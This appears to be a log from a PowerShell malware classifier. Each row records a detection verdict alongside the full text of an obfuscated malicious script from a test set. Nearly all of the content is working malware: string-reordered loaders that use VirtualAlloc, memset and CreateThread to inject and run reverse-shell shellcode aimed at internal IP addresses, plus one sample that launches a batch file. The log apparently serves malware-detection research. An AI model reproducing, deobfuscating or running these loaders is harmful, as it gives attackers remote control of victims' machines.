2026-07-13 17:03:25,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2691.ps1,custom-ps-ml,UNKNOWN,80f2309c-862a-49d3-80a4-ebb4421cf5d5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2951,1528.6,"(((\""{16}{63}{19}{59}{1}{26}{11}{12}{29}{52}{10}{0}{23}{7}{61}{6}{65}{9}{28}{25}{37}{2}{21}{50}{49}{24}{32}{41}{34}{38}{48}{36}{35}{39}{20}{62}{40}{8}{30}{53}{60}{17}{56}{51}{5}{47}{43}{44}{14}{33}{54}{67}{22}{4}{46}{42}{3}{68}{27}{45}{58}{15}{13}{66}{64}{18}{31}{55}{57}\"" -f'ags, IntPtr lpThreadId);[DllImport(Mwimsvcrt.dllMwi)]public static extern IntP','M','0xac,0x3c','56,0x6a,0x00,0x68,0x58,0xa4,0x53','xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a','00,0','ame MwiWin32Mwi -namespace Win32Functions -passthru;[Byte[','Add-Type -memb',',0','9,0x00,0x00','tPtr lpParameter, uint dwCreationFl','(IntPtr lpThread','Attributes, uint dwStackSize, IntPtr lpSt','){cgTg = cgTz','xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x','gt 0x1000','cgTipl = 7Oq[DllIm',',0x0','40);fo','wi)]public static extern I','f,',',0x61,0x7c,0x02,0','57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0','tr memset(IntPtr dest, uint src, uint count);7Oq;cgTw = ',',0x8b,0x42,0x3c,0x01,0xd','2,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x3','wikernel32.dllMwi)]public static extern IntPtr CreateThread','7,0x68,0x02,0xd9,0xc8,0x',',0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x7','artAd','x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0','r (cgTi=0;cgTi -le (cgTz.Length-1);cgTi++) {cgTw::memset([IntPtr](cgTLRD3.ToInt32()+cgTi), cgTz[cgTi], 1)};cgTw::CreateThread(0,0,cgTLRD3,0,0,0);for (;;){Start-sle','0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4','68,0xc0,0xa8,0x3d,0x80,0x68,0x02,0x00,0x01,0','1,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x3','0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0','0xe0,0x75,0xf4,0x03,','1,0xc0,','1,0xff,0x31,0xc0,0xac,0xc1','x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5','a,0x8b,0x12,0xeb,0x86,0x5d','a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x0','xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x','0x50,0x68,0xea',',0x0f,0','5f,0xff,0xd',',0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0','xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,',',0xcf,0x0d,0x01,0xc7,0x38,','8b,0x52,0x10','x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x','0,0x68,0x29,0x80,0x6b,0x','dress, In','x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,','xbb,0x89,0xe6,0x6a,0x10,0x56,0','e','0,0x29,0xc4,0x54,0x5','p 60};','5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;cgTg = 0x1000;if (cgTz.Length -','ntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(','0x00','erDefinition cgTipl -N','0x5','port(Mwikernel32.dllM','gth};cgTLRD3=cgTw::VirtualAlloc(0,0x1000,cgTg,0x',']];[Byte[]]cgTz = 0xfc,0xe8,0x8','.Len','x',',0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x5')) -crEPLAce([ChaR]55+[ChaR]79+[ChaR]113),[ChaR]39 -crEPLAce([ChaR]77+[ChaR]119+[ChaR]105),[ChaR]34 -crEPLAce  'cgT',[ChaR]36) |. ( $ENv:CoMSpEc[4,26,25]-JoIN'')",malicious,TP
2026-07-13 17:03:30,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2698.ps1,custom-ps-ml,UNKNOWN,49990be3-55af-4cf0-8bb1-cc0c62bc93ca,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2905,1562.71," (((\""{44}{26}{49}{54}{45}{48}{36}{15}{14}{28}{60}{37}{21}{50}{57}{16}{8}{6}{68}{61}{31}{29}{35}{43}{7}{4}{52}{65}{25}{23}{18}{38}{0}{2}{5}{69}{47}{1}{20}{17}{51}{53}{67}{63}{10}{40}{24}{39}{58}{12}{64}{30}{41}{34}{55}{3}{42}{62}{59}{13}{19}{56}{9}{66}{33}{22}{46}{32}{11}{27}\""-f'5',',0x5b,0x5b,0x61,0x',',0xe2,0x58,0x8b,0x58,0x24,0',',0x00,0x68,0x5','x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0','x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0','IntPtr memset(IntPtr dest, uint src, uint count);Sfi;Xxnw = Add-Type -memberDefin',',0xc0,0x74,0x4a,0','n ','0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec','x00','[IntPtr](Xxnx.ToInt32()+Xxni), Xx','x68,0xc0,0xa8','93,0x53,0x6a,0x00,0x56,0x53','read(IntPtr lpThreadAttributes, uint dwStac','q)]public static extern IntPtr CreateTh','r','x12,0xeb,0x86,',',0x38,0xe0,0x75,0xf4,0x03,0x7d,',',0x57,0x68,0x02,0xd','59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0','eationFlags, IntPtr lpThreadId);[DllImport(1Hq','}','01,0xc7',',0x54,0x50,0x68,0x29,0x80,0x6b,','xcf,0x0d,0x','mport','nz[Xxni], 1)};Xxnw::CreateThread(0,0,Xxnx,0,0,0);for (;;){Start-sleep 60};','kSize, ','xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0','0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,',',0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0','Xxni=0;Xxni -le (Xxnz.Length-1);Xxni++) {Xxnw::memset(','x1000){Xxng = Xxnz.Length',',','x57,0x8b,0x52,0x10,0x8b,0x42,0x3','tect);[DllImport(1Hqkernel32.dll1H','ress, IntPtr lpParameter, uint dwCr','0xf8,0x3b,0x7d,0x24,0x7','0x00,0xff,0',',0x29,0xc4','0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56','8,0x','c,0x01,0xd0,0x8b,0x40,0x78,0x85','Xxnc = Sfi[DllI','VirtualAlloc(IntPt',';Xxnx=Xxnw::VirtualAlloc(0,0x1000,Xxng,0x40);for (',',0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24','r lpAddress, uint dwSize, uint flAllocationType, uint flPro','(1Hqkernel32.dll1Hq)','msvcrt.d','0x5d,0x68,0x33,0x32,0x00,0x00,0','x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31','x68,0x77,0x73,0',']public static extern IntPtr ','0x6a','9,0xc8,0x5f,0xff,0xd5,','ll1Hq)]public static exte','xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0','0xe5,0xff,0xd5,0x','IntPtr lpStartAdd','-namespace Win32Functions -passthru;[Byte[]];[Byte[]]Xxnz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a','a4,0x53,','0xd5,0xb8,0x90,0x01,0x00,0',',0x00,0x69,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,',',0xc0,0xac,0xc1,0',',0xc3;Xxng = 0x1000;if (Xxnz.Length -gt 0','x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,','ition Xxnc -Name 1HqWin321Hq ','x1c,0x01'))  -cREplacE 'Xxn',[char]36 -rePlacE  '1Hq',[char]34 -rePlacE ([char]83+[char]102+[char]105),[char]39)|iNvOkE-ExPRessIon",malicious,TP
2026-07-13 17:03:33,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2700.ps1,custom-ps-ml,UNKNOWN,6681b28c-f5fd-4176-a491-480d5313d69c,DESKTOP-BAC9DBQ,malicious,0.9047,RandomForest,409,1628.64,". ((vAriAblE '*Mdr*').NaME[3,11,2]-joIN'')(((\""{3}{8}{13}{15}{12}{9}{20}{19}{10}{1}{2}{24}{6}{22}{21}{16}{7}{18}{23}{27}{29}{17}{4}{11}{26}{14}{25}{28}{0}{5}\"" -f 'ad.batb','ion)','.Shel','(Ne','e','pq);','xec','as4','w-Ob','t -','l.Applicat','sk','c','j','as','e',':','as4D','Us','m Shel','co','te(bpqC','u','ersas','lE','4p','top','4a','s_lo','gavran')).rEpLacE('as4','\\').rEpLacE('bpq',[StRING][cHAR]39) )",malicious,TP
2026-07-13 17:03:38,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2704.ps1,custom-ps-ml,UNKNOWN,93fab58c-015e-4709-a661-e1d55bfb1585,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2759,1515.11,"((\""{19}{39}{33}{11}{22}{14}{2}{27}{7}{8}{23}{37}{13}{35}{5}{26}{30}{40}{36}{45}{15}{43}{6}{21}{31}{20}{10}{9}{16}{28}{42}{12}{3}{34}{29}{1}{17}{41}{18}{38}{32}{44}{0}{25}{4}{46}{24}\"" -f '-gt 0x1000){',',0xd5,0','tartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(Qfrmsvcr','xa5,0x74,0x61,0xff','ngth-1);Wxwi++) {Wxww::memset([IntPtr](W','1,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x',',0x00',' src, uint count);l7q',';Wxww = Add-Type -me','50,0x50,0x4','50,0x','int flProtect);[DllImpor','6,0x6a,0x10,0x56,0x57,0x68,0x99,0','x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57','tr lpS',',0x26,0x07,0xff,0xd5,0xb8,0','0,0x50','x8b,0x36,','0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x','Wxwc = l7q[DllImport(Qfrkernel32.dllQfr)]public static extern IntPt',',0x00,0xff,0xd5,0x50,0x',',0x29,0xc4,0x54,0x50,0x68','t(Qfrkernel32.dllQfr)]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntP','mberDefinition Wxwc -Name QfrWin32Qfr -namespace Win32Functions -passthru;[Byte[]];[Byte[]]Wxwz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89','for (;;){Start-sleep 60};','Wxwg = Wxwz.Length};Wxwx=Wxww::VirtualAlloc(0,0x1000,Wxwg,0x40);for (Wxwi=0;Wxwi -le (Wxwz.Le','38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x','t.dllQfr)]public static extern IntPtr memset(IntPtr dest, uint',',0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x44,0x68,0x02,0x00,0x01,0xbb,0x','xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff','75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x0',',0x29,0x80,0x6b','0x1000;if (Wxw',' uint dwSize, uint flAllocationType, u',',0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0',',0x8b,0x52,0x10,0x8b,0x42,0x3c,0x0','59,0x5',',0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0','85,0xf6,0x75,0xec,0xc3;Wxwg = ','r VirtualAlloc(IntPtr lpAddress,','1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x','0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,','89,0xe','x90,0x01,0x00','z.Length ','a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77','xwx.ToInt32()+Wxwi), Wxwz[Wxwi], 1)};Wxww::CreateThread(0,0,Wxwx,0,0,0);')).replaCE('Qfr',[STRiNG][CHaR]34).replaCE('l7q',[STRiNG][CHaR]39).replaCE('Wxw','$')|. ( $VERBosEPReFErEnCE.TostrINg()[1,3]+'x'-JoIN'')",malicious,TP
2026-07-13 17:03:50,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2705.ps1,custom-ps-ml,UNKNOWN,1fbb6980-2cd2-49d3-ac4d-248af103128c,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3192,1477.17,".( ([STRiNG]$veRBOSePreFerEncE)[1,3]+'X'-JoIN'')( ((\""{39}{24}{45}{52}{20}{40}{34}{8}{9}{46}{48}{10}{44}{43}{51}{18}{50}{22}{23}{38}{31}{16}{35}{25}{1}{29}{4}{49}{7}{27}{17}{15}{21}{12}{33}{5}{0}{37}{6}{3}{28}{47}{2}{41}{32}{26}{30}{11}{36}{19}{14}{42}{13}\""-f '6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00','8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,','0){PWog = PWoz.Length};PWox=PWow::VirtualAlloc(0,0x1000,PWog,0x40);for',',0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf','2,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x2','74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x','00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02',',0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd','ationFlags, IntPtr',' lpThread','2Func','ystem.Convert]::ToBase64String([Syste',',0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc','ell PWo2 PWoeX0p;}','e -eq 8){PWo3 = PWoenv:SystemRoot + X0pTLfsyswow64TLfWindowsPowerShellTLfv1.0TLfpowershellX0p;iex X0p&amp; PWo3 PWo2 PWoeX0p}else{;iex X0p&amp; pow','0xa8,0x01,0x8','0,0x01,0xd3,0xe3,0x3c,0x49,0','97,0x6a,0x05,0x68,0xc0,','c,0x3','c X0p;if([IntPtr]::Siz','llImport(X0pkernel32.dllX0p)]public static exte','0,0x68,0x02,0x00,0x11,0x5c','x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x0','1,0xd0,0x8b,0x40,','p)]public static extern IntPt',',0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x','eThread(0,0,PWox,0,','5,0x','6,0x75,0xec,0x','0x86,0x5d,0x68,0x33,0x3','0,0);for (;;){Start-sleep 60};b9Q;PWoe = [S','x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x2',' 1)};PWow::Creat','0,0x','meter, uint dwCre','x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d','m.Text.Encoding]::Unicode.GetBytes(PWo1));PWo2 = X0p-en',',0x','0x78,0x85,0xc0,0','PWo1 = b9QPWoc = b9Qb9Q[DllImport(X0pkernel32.dllX0','rn IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpPara',' (PWoi=0;PWoi -le (PWoz.Length-1);PWoi++) {PWow::memset([IntPtr](PWox.ToInt32()+PWoi), PWoz[PWoi],','ersh','= 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x','tions -passthru;[Byte[]];[Byte[]]PWoz ','r VirtualAlloc(IntPtr lpAddress, uint dwSi','Id);[DllImport(X0pmsvcrt.dllX0p)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);b9Qb9Q;PWow = Add-Type -membe','c3;PWog = 0x1000;if (PWoz.Length -gt 0x100','rDefinition PWoc -Name X0pWin32X0p -namespace Win3','6,0x07,0xff,0xd5,0xb8,0x90,0x01','c,0x61,0x7c,0x02,0x2c,0','8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xa','ze, uint flAllocationType, uint flProtect);[D')).rePlACe(([chAR]80+[chAR]87+[chAR]111),'$').rePlACe('b9Q',[strING][chAR]39).rePlACe('TLf',[strING][chAR]92).rePlACe(([chAR]88+[chAR]48+[chAR]112),[strING][chAR]34))",malicious,TP
2026-07-13 17:04:00,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2725.ps1,custom-ps-ml,UNKNOWN,2f93fba2-01bc-4036-b8fd-d4ed48e721f3,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2943,1498.23,"((\""{66}{53}{39}{7}{30}{56}{49}{46}{8}{3}{44}{20}{34}{17}{22}{23}{57}{24}{9}{11}{38}{62}{63}{60}{67}{42}{26}{4}{12}{68}{21}{10}{55}{54}{31}{43}{15}{6}{61}{69}{25}{37}{27}{19}{32}{36}{52}{29}{64}{14}{5}{35}{65}{0}{41}{59}{40}{1}{13}{58}{50}{16}{47}{45}{2}{28}{48}{33}{18}{51}\"" -f '00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,','0,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,','lloc(0,0x1000,pucsize,0x40);f','est, uint src, uint count);gZW;pucw = Add-Type -memberDefinition pucc -Name i2cWin32i2c -n','x01,0xd6,0x31,0xff,0x',',0xff,',',0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00','blic static extern IntPtr Virtu','Ptr memset(IntPtr d','1,0xc7,0xe2,0x',',0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,','f','31,0xc0,','0x85,0xf6,0x75,0xec,0xc3;pucsize = 0x1000','0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c','a,0x8b,0x12',' 0','x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0','ateThread(0,0,pucx,0,0,0)','6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,','x',',0x75','x8b,0x52,0x14,0x8b,0x72,0x2','8,0x0f,0xb7,0x4a','ac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x0','x54,0x68,0x4c,','0x34,0x8b,0','b8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x','or (puci=0;puc','x00,0x50,0x89,0xe6,0x6a','alAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flPr','e0,0x58,0x5f','0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0','sc.Length-1);puci++) {pucw::memset([IntPtr](pucx.ToInt32()+puci), pucsc[puci], 1)};pucw::Cre','e8,0x89,0x00,0','0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x5','xc0,0xa8,0xf5,0x87,0x68,0x02,0x0','0x77,0x26,0x07,0xff,0xd5,0x','0','c)]pu','x68,0x00,0x1','0x36','x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,',',0x5','amespace Win32Functions -passthru;[Byte[]];[Byte[]]pucsc = 0xfc,0','VirtualA','ss, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(i2cmsvcrt.dlli2c)]public static extern Int','x1000){pucsize = pucsc.Length};pucx=pucw::','i -le (puc','c extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddre','-gt',';for (;;){Start-sleep 60};','0,0','W[DllImport(i2ckernel32.dlli2','ff,0x','0x5a,0x51,0x','otect);[DllImport(i2ckernel32.dlli2c)]public stati',',0x26,0x31,0xff,0x31,0xc0,0x',';if (pucsc.Length ',',0x6a,0x40,0','3c,0x01,0xd0,0x8',',0x68,0x77,0x73',',0x52,0x57,0x8b,0x52,0x10,0x8b,0','x42,0x',',0x10,0x56,0x57,','6,0xff,0xd5,0x6a,0x','pucc = gZ','b,0x40,0x78,0x85,0xc0,0x74,0','0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0',',0x32,0x5f,0')).rePLacE('gZW',[StRiNg][ChAR]39).rePLacE('i2c',[StRiNg][ChAR]34).rePLacE(([ChAR]112+[ChAR]117+[ChAR]99),'$') |. ( $sHelLID[1]+$ShElLid[13]+'X')",malicious,TP
2026-07-13 17:04:12,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\2734.ps1,custom-ps-ml,UNKNOWN,8531a97c-5b92-45b1-b215-8be4f7ca091d,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2908,1462.71," (((\""{2}{47}{24}{46}{10}{28}{11}{29}{8}{12}{33}{32}{22}{45}{40}{5}{37}{20}{17}{27}{38}{48}{3}{9}{7}{31}{19}{41}{25}{44}{26}{1}{30}{6}{16}{4}{14}{43}{34}{15}{13}{42}{0}{36}{21}{23}{35}{18}{39}\"" -f 'x6a,0x4b,',',0x5c,0x4d,0x8a,0x8a,0x0e,0xc2,0x6a,0x7b','nYqM47 = fPs[DllImport(W3Jkernel32.dllW3J)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(W3Jkernel32.dllW3J)]public stat','9,0x79,0','0x9b,0x7b,0x9d,0x45,0x0d,0x83,0x0b,0xe3,0xb1,0x11,0xb0,0xa2,0xe6,0x8d,0xba,0x93,0xc0,0x11,0x44,0xf6,0x5b,0x9b,0x','x96,0x9f,0x0d,0x89,0x8b,0xdc,0x0c,0x09,0xd6,0x30,0xef,0x30,0x19,0x45,0xee,0x75,0x44,0xa4,0xa2,0x2e,0x02,0x1b,0x53,0x5b,0x5e,0xa0,0xd8,0x17,0x4e','75,0xe5,0xf0,0x','ac,0x86,0x9d,0x54,0x','7 -Name W3JWin32W3J -namespace Wi','x41,0x','ntPtr dest','inition n','n32Fun',',0x1d,0x43,0xf9,0x19,0x74,0x3','d0,',',0x3a,0xab,0x62,0x3b,0x69,0xce,0x6c,0x96','04,0xf0,0x25,0x7a,0xab,0x04,0xeb,0x8b,0xc6,0x16,','x27,0x3f,0x','w::memset([IntPtr](nYqsDbj.ToInt32()+nYqi), nYqz','x71,0x7d,0xca,0xef,0xdf,0xd0,0xf3,0xf0,0x80,0x8d,0x51,0x7a,0x2c,0x','x87,0xad,0x44,0','{nYqg = nYqz.Length};nYqsDbj=nYqw::VirtualAlloc(0,0x1000,nYqg,0x40);for (nYqi=0;nYqi -le (nY',',0xbf,','qz.Length-1);nYqi++) {','IntPtr lpStartAddress, Int','0xc6,0xd9,0xb8,0x38,0x51,0xa9,0x8a,0xe7,0xc9,0x25,0xa6,0x60,0xd4,0xb2,0xc9,0x5a,0xa0,0x2d,0x3','0xdf,0xdc,0xef,0xe7,0xda,0x4a,0x15,0x23,0x22,0xb5,0x7d,0xd1,0xab,0xd8,0x20','0a,0x75',', uint src, uint count);fPs;nYqw = Add-Type -memberDef','YqM4',',0xef,0xb2,0x02,0x91,0xe0,0xed,0x32,0x9a,0x2a,0x86,0xd8,0x75,0x83,0xfe,0x74,0xef,0x8e,0x','61,0xbd,0x99,0xdd,0x84,0x12,0x28,0xa5,0xa2,0xb6,0','58,0xd9,0xee,0xd9,0x74,0x24,0xf4,0x5e,0x29,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x31,0x56,0x0f,0x03,0x56','ctions -passthru;[Byte[]];[Byte[]]nYqz = 0xba,0xb0,0x29,0xcf,0x','0x34,0x3a,0xc3,0xb2,0x5e','nYq','0x60;nYqg = 0x1000;if (nYqz.Length -gt 0x1000)',',0xa0,0x3d,0xef,0x71,0x81,0x93,0x64,0x28,0x01,0x15,0xa9,0x40,0x08,0x0d,0xae,0x6d,0xc2,0xa6,0x04,0x19,0xd5,0x6e,0x55,0xe2,0x7a,0x4f,0x5a,0x11,0x82,0x97,0x5c,0xca,0xf1,0xe1,0x9f,0x77,0x02,0x36,0xe2,0xa3,0',',0xe4,0x','[nYqi], 1)};nYqw::CreateThread(0,0,nYqsDbj,0,0,0);for (;;){Start-sleep 60};','x88,0x9e,0x38,0x94,0x24,0x54,0x6c,0x0d,0xbf,0x18,0xb9,0x22,0x08,0','d9,0xeb,0x21,0x38,0x2e,','0,0xaa,0x71,0x7a,0x6f,0x9c,0xdd,0x85,0x5a,0x1c,0x21,0x50,0xa2,0','0xb9,0x33,0xe4,','4,0x65,0xd1,0x64,0xf2,0x31,0x81,0x1e,0xd3,0x39,0x4a,','0xcb,0x3a,0xa4,0x57,0x89,0xc5,0x55,0xa7,0xee,0x4c,0xb0,0x96,0x2e,0x2a,0xb0,0','Ptr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(W3Jmsvcrt.dllW3J)]public static extern IntPtr memset(I','ic extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, ','a6,0xd'))  -rePlace  ([CHaR]102+[CHaR]80+[CHaR]115),[CHaR]39-CrePlaCE'W3J',[CHaR]34 -rePlace  ([CHaR]110+[CHaR]89+[CHaR]113),[CHaR]36) | &amp;( $ShElliD[1]+$shElLId[13]+'x')",malicious,TP
